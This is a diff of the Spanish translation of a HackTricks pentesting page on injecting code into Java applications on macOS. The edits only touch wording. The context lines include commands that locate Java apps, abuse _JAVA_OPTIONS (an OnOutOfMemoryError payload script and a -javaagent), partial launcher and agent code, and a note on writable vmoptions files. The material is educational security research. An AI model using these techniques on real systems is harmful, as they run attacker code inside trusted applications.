@@ -1,10 +1,10 @@
-# Inyección de Aplicaciones Java en macOS
+# Inyección en aplicaciones Java
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Enumeración
 
-Encuentra aplicaciones Java instaladas en tu sistema. Se observó que las aplicaciones Java en el **Info.plist** contendrán algunos parámetros de java que contienen la cadena **`java.`**, así que puedes buscar eso:
+Busca las aplicaciones Java instaladas en tu sistema. Se observó que las aplicaciones Java en **Info.plist** contendrán algunos parámetros de Java que incluyen la cadena **`java.`**, por lo que puedes buscarla:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,13 +14,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-La variable de entorno **`_JAVA_OPTIONS`** se puede utilizar para inyectar parámetros java arbitrarios en la ejecución de una aplicación compilada en java:
+La variable de entorno **`_JAVA_OPTIONS`** se puede utilizar para inyectar parámetros arbitrarios de Java en la ejecución de una app compilada en Java:
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-Para ejecutarlo como un nuevo proceso y no como un hijo del terminal actual, puedes usar:
+Para ejecutarlo como un proceso nuevo y no como un proceso hijo del terminal actual, puedes usar:
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -73,7 +73,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Sin embargo, eso provocará un error en la aplicación ejecutada, otra forma más sigilosa es crear un agente de Java y usar:
+Sin embargo, eso provocará un error en la aplicación ejecutada; otra forma más sigilosa es crear un java agent y usar:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -83,9 +83,9 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 > [!CAUTION]
-> Crear el agente con una **versión de Java diferente** a la de la aplicación puede hacer que se bloquee la ejecución tanto del agente como de la aplicación
+> Crear el agente con una **versión de Java diferente** a la de la aplicación puede bloquear la ejecución tanto del agente como de la aplicación
 
-Donde el agente puede ser:
+El agente puede estar en:
 ```java:Agent.java
 import java.io.*;
 import java.lang.instrument.*;
@@ -114,7 +114,7 @@ Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-Y luego exporta la variable de entorno y ejecuta la aplicación java así:
+Y luego exporta la variable de entorno y ejecuta la aplicación Java así:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -125,12 +125,12 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 ```
 ## archivo vmoptions
 
-Este archivo admite la especificación de **parámetros de Java** cuando se ejecuta Java. Podrías usar algunos de los trucos anteriores para cambiar los parámetros de Java y **hacer que el proceso ejecute comandos arbitrarios**.\
-Además, este archivo también puede **incluir otros** con el directorio `include`, por lo que también podrías cambiar un archivo incluido.
+Este archivo permite especificar **parámetros de Java** cuando se ejecuta Java. Podrías usar algunos de los trucos anteriores para cambiar los parámetros de Java y **hacer que el proceso ejecute comandos arbitrarios**.\
+Además, este archivo también puede **incluir otros** mediante el directorio `include`, por lo que también podrías cambiar un archivo incluido.
 
-Aún más, algunas aplicaciones de Java **cargarán más de un archivo `vmoptions`**.
+Además, algunas aplicaciones Java **cargarán más de un archivo `vmoptions`**.
 
-Algunas aplicaciones como Android Studio indican en su **salida dónde están buscando** estos archivos, como:
+Algunas aplicaciones, como Android Studio, indican en su **salida dónde están buscando** estos archivos, por ejemplo:
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -141,7 +141,7 @@ Algunas aplicaciones como Android Studio indican en su **salida dónde están bu
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-Si no lo hacen, puedes verificarlo fácilmente con:
+Si no lo hacen, puedes comprobarlo fácilmente con:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -149,6 +149,6 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Nota lo interesante que es que Android Studio en este ejemplo está intentando cargar el archivo **`/Applications/Android Studio.app.vmoptions`**, un lugar donde cualquier usuario del **`grupo admin` tiene acceso de escritura.** 
+Observa lo interesante que es que Android Studio, en este ejemplo, intenta cargar el archivo **`/Applications/Android Studio.app.vmoptions`**, un lugar en el que cualquier usuario del **grupo `admin` tiene permisos de escritura.**
 
 {{#include ../../../banners/hacktricks-training.md}}
